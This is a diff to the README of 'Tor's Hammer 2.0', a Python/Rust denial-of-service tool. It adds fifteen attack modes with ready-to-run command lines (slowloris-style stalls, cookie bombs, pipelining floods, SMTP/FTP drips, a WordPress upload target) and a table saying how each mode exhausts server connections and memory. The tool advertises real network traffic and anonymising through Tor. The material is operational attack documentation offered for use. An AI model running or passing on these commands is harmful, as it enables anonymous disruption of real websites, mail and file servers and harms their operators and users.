@@ -7,7 +7,7 @@ Tor's Hammer 2.0 ships **two integrated runtimes** that work through a unified C
 | Python backend | Python 3.11+ | `src/torshammer/` | Main attack tool with asyncio engine | **Production-ready** |
 | Rust backend | Rust (edition 2021) | `rust/` | High-performance attack engine | **Production-ready** |
 
-Both backends are **fully functional** and can be selected via the `--backend` flag in the unified CLI. Both support **real TCP/IP and UDP networking** with feature parity across all attack modes, including slow-post, slow-headers, chunked, slow-read, and UDP flood.
+Both backends are **fully functional** and can be selected via the `--backend` flag in the unified CLI. Both support **real TCP/IP and UDP networking** with feature parity across all fifteen attack modes: `slow-post`, `slow-post-headers`, `slow-headers`, `slow-read`, `chunked`, `multipart-slow-upload`, `expect-continue-abuse`, `websocket-slow-upgrade`, `http-pipelining`, `range-abuse`, `cookie-bomb`, `jsonrpc-slow`, `smtp-slow-envelope`, `ftp-slow-command`, and the UDP flood.
 
 ---
 
@@ -84,6 +84,19 @@ torshammer -u http://example.com -m chunked -c 200
 
 # Slow-read mode (consumes server response bandwidth)
 torshammer -u http://example.com -m slow-read -c 150
+
+# Multipart upload + Expect stall (upload-heavy targets such as WordPress media)
+torshammer -u http://example.com/wp-admin/media-new.php -m multipart-slow-upload -c 128
+torshammer -u http://example.com -m expect-continue-abuse -c 128
+
+# Protocol-specific modes (same flag on both backends)
+torshammer -u http://example.com -m websocket-slow-upgrade -c 200
+torshammer -u http://example.com -m http-pipelining -c 200
+torshammer -u http://example.com/large.bin -m range-abuse -c 100
+torshammer -u http://example.com -m cookie-bomb -c 200
+torshammer -u http://example.com/rpc -m jsonrpc-slow -c 200
+torshammer -u http://example.com:25 -m smtp-slow-envelope -c 100
+torshammer -u http://example.com:21 -m ftp-slow-command --backend rust -c 100
 
 # Anonymize via Tor (expect Tor on 127.0.0.1:9050)
 torshammer -u http://localhost:8080 --tor
@@ -169,7 +182,7 @@ Both backends use **actual network protocols** (not simulations):
 - **Python backend**: Uses `asyncio.open_connection()` with real TCP sockets
 - **Rust backend**: Uses `std::net::TcpStream` with real TCP sockets
 - Supports HTTP/HTTPS with proper TCP handshakes and connection management
-- All TCP modes (slow-post, slow-headers, chunked, slow-read) use real network I/O
+- All TCP modes (slow-post, slow-post-headers, slow-headers, chunked, slow-read, websocket-slow-upgrade, http-pipelining, range-abuse, cookie-bomb, jsonrpc-slow, smtp-slow-envelope, ftp-slow-command) use real network I/O
 
 ### UDP Networking
 - **Python backend**: Uses `asyncio.DatagramProtocol` with real UDP sockets
@@ -189,10 +202,20 @@ Both backends use **actual network protocols** (not simulations):
 
 | Mode | Protocol | Backend Support | Description |
 |---|---|---|---|
-| slow-post | TCP | Python + Rust | Sends partial POST data very slowly |
-| slow-headers | TCP | Python + Rust | Sends HTTP headers at a trickle |
-| chunked | TCP | Python + Rust | Uses chunked transfer encoding with delays |
-| slow-read | TCP | Python + Rust | Consumes server response bandwidth slowly |
+| slow-post | TCP | Python + Rust | Sends partial POST body very slowly (large `Content-Length`) |
+| slow-post-headers | TCP | Python + Rust | Leaks the request line and each header, then dribbles the body |
+| slow-headers | TCP | Python + Rust | Sends HTTP headers at a trickle (slowloris) |
+| chunked | TCP | Python + Rust | Uses chunked transfer encoding with delays, no terminating chunk |
+| slow-read | TCP | Python + Rust | Consumes server response bandwidth slowly (8 bytes at a time) |
+| multipart-slow-upload | TCP | Python + Rust | Dribbles MIME-part content, closing boundary never emitted |
+| expect-continue-abuse | TCP | Python + Rust | Stalls the body after the interim `100 Continue` response |
+| websocket-slow-upgrade | TCP | Python + Rust | Sends WebSocket upgrade headers, never completes the handshake |
+| http-pipelining | TCP | Python + Rust | Pipelines up to 50 requests per connection without reading responses |
+| range-abuse | TCP | Python + Rust | Sends up to 100 randomized `Range:` requests per connection |
+| cookie-bomb | TCP | Python + Rust | Sends a ~10 KB random `Cookie` header and holds the connection |
+| jsonrpc-slow | TCP | Python + Rust | Dribbles a JSON-RPC payload that is never completed |
+| smtp-slow-envelope | TCP | Python + Rust | Drips SMTP envelope commands, never sends `DATA` |
+| ftp-slow-command | TCP | Python + Rust | Drips FTP commands, never completes a data transfer |
 | udp | UDP | Python + Rust | Floods target with UDP datagrams |
 
 ---
@@ -296,11 +319,11 @@ The attacks use **real network traffic** and will work against accessible target
 
 ### Protocol-Specific Behavior
 
-**TCP Attack Modes (slow-post, slow-headers, chunked, slow-read):**
+**TCP Attack Modes (slow-post, slow-post-headers, slow-headers, chunked, slow-read, websocket-slow-upgrade, http-pipelining, range-abuse, cookie-bomb, jsonrpc-slow, smtp-slow-envelope, ftp-slow-command):**
 - Opens real TCP connections to target:port
-- Sends partial HTTP requests very slowly
+- Sends partial or malformed-completion protocol data very slowly
 - Keeps connections open and consuming server resources
-- Works against web servers, APIs, HTTP services
+- Works against web servers, APIs, WebSocket endpoints, mail/FTP servers
 - Can exhaust connection limits, memory, and processing capacity
 
 **UDP Attack Mode:**
@@ -390,6 +413,14 @@ torshammer -m udp -u udp://example.com:53 -c 100 -d 10 --backend rust --json > r
 torshammer -u http://example.com -m slow-headers -c 200
 torshammer -u http://example.com -m chunked -c 300 --backend rust
 torshammer -u http://example.com -m slow-read -c 150
+torshammer -u http://example.com -m slow-post-headers -c 200
+torshammer -u http://example.com -m websocket-slow-upgrade -c 200
+torshammer -u http://example.com -m http-pipelining -c 200
+torshammer -u http://example.com/large.bin -m range-abuse -c 100
+torshammer -u http://example.com -m cookie-bomb -c 200
+torshammer -u http://example.com/rpc -m jsonrpc-slow -c 200
+torshammer -u http://example.com:25 -m smtp-slow-envelope -c 100
+torshammer -u http://example.com:21 -m ftp-slow-command -c 100
 
 # Tests
 pytest                           # Python tests
